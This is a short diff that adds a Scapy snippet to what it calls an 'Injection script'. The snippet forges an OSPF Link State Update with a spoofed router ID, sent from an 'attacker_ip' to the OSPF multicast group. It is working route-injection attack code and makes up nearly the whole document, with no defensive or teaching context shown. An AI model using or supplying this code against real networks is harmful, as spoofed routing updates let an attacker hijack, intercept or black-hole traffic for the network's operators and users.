@@ -1,0 +1,9 @@
+**Add this code to the Injection script:
+
+lsa = OSPF_LSA_Hdr(type=1, id="10.10.10.0", advrouter=spoofed_router_id, length=20)
+
+lsa_update = IP(dst="224.0.0.5", src=attacker_ip) / \
+             OSPF_Hdr(routerid=spoofed_router_id, area=area_id, type=4) / \
+             OSPF_LSUpd(lsacount=1, lsalist=[lsa])
+
+send(lsa_update, iface="eth0")
